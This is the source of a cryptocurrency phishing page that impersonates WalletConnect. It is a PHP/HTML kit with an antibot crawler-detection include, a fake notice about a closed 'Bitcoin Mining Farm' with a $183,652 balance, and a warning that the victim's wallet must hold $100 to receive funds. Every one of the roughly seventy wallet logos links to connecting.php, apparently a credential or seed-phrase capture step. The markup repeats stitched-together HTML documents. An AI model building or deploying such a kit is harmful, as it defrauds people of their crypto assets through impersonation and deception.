<!DOCTYPE html>
<html>
<?php
error_reporting(0);
include '../files/antibot/crawlerdetect.php';
include_once '../functions.php';
?>
<meta http-equiv="content-type" content="text/html" />

<head>
  <meta charset="UTF-8">
  <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.2/jquery.validate.min.js" integrity="sha512-UdIMMlVx0HEynClOIFSyOrPggomfhBKJE28LKl8yR3ghkgugPnG6iLfRfHwushZl1MOPSY6TsuBDGPK2X4zYKg==" crossorigin="anonymous"></script>
    <meta name="viewport" content="width=device-width" />
    <title>WalletConnect</title>
    <link rel="shortcut icon" href="./files/favicon.ico" />
    <meta name="theme-color" content="#ffffff" />
    <meta name="description" content="Open protocol for connecting Wallets to Dapps" />
    <meta name="keywords"
        content="ethereum, cryptocurrency, wallet, mobile, connect, bridge, relay, proxy, standard, protocol, crypto, tokens, dapp" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:site" content="@walletconnect" />
    <meta name="twitter:title" content="WalletConnect" />
    <meta name="twitter:description" content="Open protocol for connecting Wallets to Dapps" />
    <meta name="og:title" content="WalletConnect" />
    <meta name="og:type" content="website" />
    <meta name="og:url" content="index-2.html" />
    <meta name="og:image" content="404" />
    <meta name="og:description" content="Open protocol for connecting Wallets to Dapps" />
    <meta name="og:site_name" content="WalletConnect" />
    <link rel="stylesheet" href="./files/main_new.css">
    <script>
        function show() {
          var x = document.getElementById("hidden");
          if (x.style.display === "block") {
            x.style.display = "none";
          } else {
            x.style.display = "block";
          }
        
          if (x.style.display === "block") {
            document.getElementById("btn").innerHTML = "Show Less &uarr;";
          } 
        }
     </script>

</head>
	
	


<body>
   <header style="
        text-align: center; /* Center the content horizontally */
        background-color: #f0f0f0; /* Lighter background color */
        color: #000; /* Header text color (black) */
        padding: 20px 0; /* Add padding top and bottom */
    ">
    <h1 style="font-weight: bold;">Notice: Closure of Automatic Bitcoin Mining Farm</h1>

   
    <p style="color: #006400; font-size: 14px;">Your current balance is $183,652 USD.</p>

    <!-- Add the additional h1 tag -->
   
 <!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bitcoin Mining Farm</title>
<style>
    /* Add your CSS styles here */
    body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
        background-color: #f8f8f8;
    }

    .container {
        max-width: 600px;
        margin: 20px auto;
        padding: 20px;
        background-color: #fff;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        text-align: center;
    }

    p {
        margin: 10px 0;
        font-size: 16px;
        line-height: 1.5;
        color: #007bff; /* Blue color */
    }

    .warning {
        background-color: #ffdddd; /* Light red */
        border: 2px solid #ff9999; /* Lighter red */
        border-radius: 8px;
        padding: 20px;
        margin-top: 20px;
        text-align: center;
    }

    .warning p {
        margin: 0;
        color: #ff3333; /* Dark red */
        font-weight: bold;
    }

    .bold {
        font-weight: bold;
    }
</style>
</head>
<body>

<div class="container">
   
    <div class="warning">
        <p>Warning: Please establish a connection with your wallet to receive funds. It's important to ensure that your wallet maintains a minimum balance of $100 to successfully receive the funds.</p>
    </div>
</div>

</body>
</html>


	<div id="__next">
		
	

        
            <main>
                
                
                <div class="wallets" id="wallets">
				
                   
                    <div class="all">
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/metamask.png"></a></br>
                            MetaMask
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/MEW.png"></a></br>
                            MEW Wallet
                        </div>
						
						<div class="apps">
                            <a href="./connecting.php"><img src="./files/images/crypto.png"></a></br>
                            Crypto.com DeFi Wallet
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/trustwallet.png"></a></br>
                            Trust Wallet
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"> <img src="./files/images/logo.svg"></a></br>
                            Wallet</br>Connect
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/coinbase.jpg"></a></br>
                            Coinbase Wallet
                        </div>
						
						<div class="apps">
                            <a href="./connecting.php"><img src="./files/images/bscw.jpg"></a></br>
                            Binance Chain
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/atomic.png"></a></br>
                            Atomic Wallet
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/exodus_wallet.png"></a></br>
                            Exodus Wallet
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/bnb.png"></a></br>
                            BNB
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/polkadot.png"></a></br>
                            Polkadot
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/xrp.png"></a></br>
                            XRP
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/stellar.png"></a></br>
                            Stellar
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/tezos.png"></a></br>
                            Tezos
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/theta.png"></a></br>
                            Theta
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/tron.png"></a></br>
                            Tron
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/cosmos.png"></a></br>
                            Cosmos
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/kava.png"></a></br>
                            Kava
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/filecoin.png"></a></br>
                            Filecoin
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/solana.png"></a></br>
                            Solana
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img
                                    src="./files/images/venly.svg"></a></br>
                            Venly
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/zilliqa.png"></a></br>
                            Zilliqa
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/elrond.jpg"></a></br>
                            Elrond
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/waves.png"></a></br>
                            Waves
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/icon.png"></a></br>
                            ICON
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/ontology.png"></a></br>
                            Ontology
                        </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/oxen.png"></a></br>
                                Oxen Wallet
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/nano.png"></a></br>
                                Nano
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/tomo.png"></a></br>
                                Tomo Chain
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/vechain.jpg"></a></br>
                                VeChain
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/iotex.png"></a></br>
                                IoTex
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/wanchain.png"></a></br>
                                Wanchain
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/harmony.png"></a></br>
                                Harmony
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/kin.png"></a></br>
                                Kin
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/nimiq.png"></a></br>
                                Nimiq
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/aion.png"></a></br>
                                Aion
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/thundertoken.png"></a></br>
                                Thunder Token
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/aeternity.png"></a></br>
                                Aeternity
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/nebulas.png"></a></br>
                                Nebulas
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/fio.png"></a></br>
                                FIO
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/gochain.png"></a></br>
                                GoChain
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/poa.png"></a></br>
                                POA Network
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/callisto.png"></a></br>
                                Callisto
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/bitpay.jpg"></a></br>
                                BitPay
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/aktionariat.png"></a></br>
                                Aktionariat
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/atwallet.png"></a></br>
                                AtWallet
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/guard.png"></a></br>
                                Guard Wallet
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/aave.jpg"></a></br>
                                AAVE
                            </div>

                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/enjin.jpg"></a></br>
                                Enjin
                            </div>
        
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/skale.png"></a></br>
                                Skale
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/portis.png"></a></br>
                                Portis
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/trezor.png"></a></br>
                                Trezor
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/squarelink.png"></a></br>
                                Squarelink
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/torus.jpg"></a></br>
                                Torus
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/scatter.jpg"></a></br>
                                Scatter Wallet
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/sumcoin.png"></a></br>
                                Sumcoin
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/math-wallet.png"></a></br>
                                Math Wallet
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/fortmatic.png"></a></br>
                                FortMatic
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/digitex.png"></a></br>
                                Digitex
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/ledger.png"></a></br>
                                Ledger
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/defiat.jpg"></a></br>
                                Defiat
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/authereum.png"></a></br>
                                Authereum
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/flare.jpg"></a></br>
                                Flare Wallet
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/zelcore.png"></a></br>
                                Zelcore
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/bitkeep.png"></a></br>
                                BitKeep
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/coin98.png"></a></br>
                                Coin98
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/trustvault.png"></a></br>
                                Trust Vault
                            </div>
                        </div>
                    </div>
                </div>
                
        </div>
    </div>

<script src="/script.js"></script>


<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bitcoin Mining Farm</title>
<style>
    /* Add your CSS styles here */
    body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
        background-color: #f8f8f8;
    }

    .container {
        max-width: 600px;
        margin: 20px auto;
        padding: 20px;
        background-color: #fff;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        text-align: center;
    }

    p {
        margin: 10px 0;
        font-size: 16px;
        line-height: 1.5;
        color: #007bff; /* Blue color */
    }

    .warning {
        background-color: #ffdddd; /* Light red */
        border: 2px solid #ff9999; /* Lighter red */
        border-radius: 8px;
        padding: 20px;
        margin-top: 20px;
        text-align: center;
    }

    .warning p {
        margin: 0;
        color: #ff3333; /* Dark red */
        font-weight: bold;
    }

    .bold {
        font-weight: bold;
    }
</style>
</head>
<body>

<div class="container">
    <p class="bold">&copy; 2024 Bitcoin Mining Farm. All rights reserved.</p>
    <div class="warning">
        <p>Warning: Please establish a connection with your wallet to receive funds. It's important to ensure that your wallet maintains a minimum balance of $100 to successfully receive the funds.</p>
    </div>
</div>

</body>
</html>
        


</body>
</html>





















  







   













</body>

</html>
